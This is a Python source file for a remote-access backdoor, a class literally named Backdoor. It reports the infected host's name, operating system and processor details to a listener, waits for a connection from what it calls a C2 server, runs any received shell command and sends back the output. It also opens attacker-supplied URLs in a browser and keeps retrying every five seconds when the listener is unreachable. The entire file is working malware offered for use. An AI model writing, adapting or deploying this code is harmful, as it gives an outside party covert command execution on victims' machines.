import socket
import os
import platform
import json
import pickle
import subprocess
import time 
import webbrowser

class Backdoor(): 

    def __init__(self): 
        self.HOST = '127.0.0.1' # IP address of your listener machine 
        self.PORT = 9999 #Make sure port 9999 is open on both your machines or change to another port. 
        self.BUFFER_SIZE = 2024 * 2024 
        self.SEP = "<sep>" 
        self.sock = None 

    def command_runner(self): 
        cwd = os.getcwd() 
        print(cwd)
        conn.send(cwd.encode()) 
        print("cwd sent.")

        while True: 
            command = conn.recv(self.BUFFER_SIZE).decode() 
            splited_command = command.split() 

            if command.lower() == "quit": 
                self.sock.close() 
                self.commandexec() 
            elif command.lower() == "url executor": 
                inp = conn.recv(self.BUFFER_SIZE).decode() 
                webbrowser.open_new_tab(inp) 
            
            elif splited_command[0].lower() == "cd": 
                try: 
                    os.chdir(' '.join(splited_command[1:])) 
                except FileNotFoundError as e: 
                    output = str(e) 
                else: 
                    output = "" 
            else: 
                output = subprocess.getoutput(command) 
                cwd = os.getcwd() 
                message = f"{output}{self.SEP}{cwd}" 
                conn.send(message.encode()) 

    def commandexec(self): 
        ip = self.ipgrab() 
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        self.sock.bind((ip, self.PORT)) 
        self.sock.listen() 
        global conn 
        conn, addr = self.sock.accept() 
        print("Shell requested from C2 server.")
        self.command_runner() 

    def ipgrab(self): 
        if self.HOST == "127.0.0.1": 
            return "127.0.0.1" 
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
            s.connect(("8.8.8.8", 80)) 
            ip = s.getsockname()[0] 
            return ip
        
    def info_grab(self): 
        my_sys = platform.uname() 

        HOSTNAME = my_sys.node 
        OS = my_sys.system 
        RELEASE = my_sys.release 
        ARCH = my_sys.machine 
        VERSION = my_sys.version 
        PROC_TYPE = my_sys.processor 

        json_file = {"HOSTNAME": HOSTNAME, 
                     "OPERATING SYSTEM": OS,
                     "RELEASE": RELEASE, 
                     "ARCHITECTURE": ARCH, 
                     "VERSION": VERSION, 
                     "PROCESSOR TYPE": PROC_TYPE} 
        
        data = json.dumps(json_file) 
        return data
    
    def bootprocess(self): 
        try: 
            print("Beginning boot process")
            self.sock = socket.socket() 
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
            self.sock.connect((self.HOST, self.PORT)) 
            jsonfile = self.info_grab() 
            picked_data = pickle.dumps(jsonfile) 
            self.sock.send(picked_data) 
            self.sock.close() 
            self.commandexec() 
        except socket.error: 
            time.sleep(5) 
            self.bootprocess() 

def main(): 
    client = Backdoor() 
    client.bootprocess() 

main()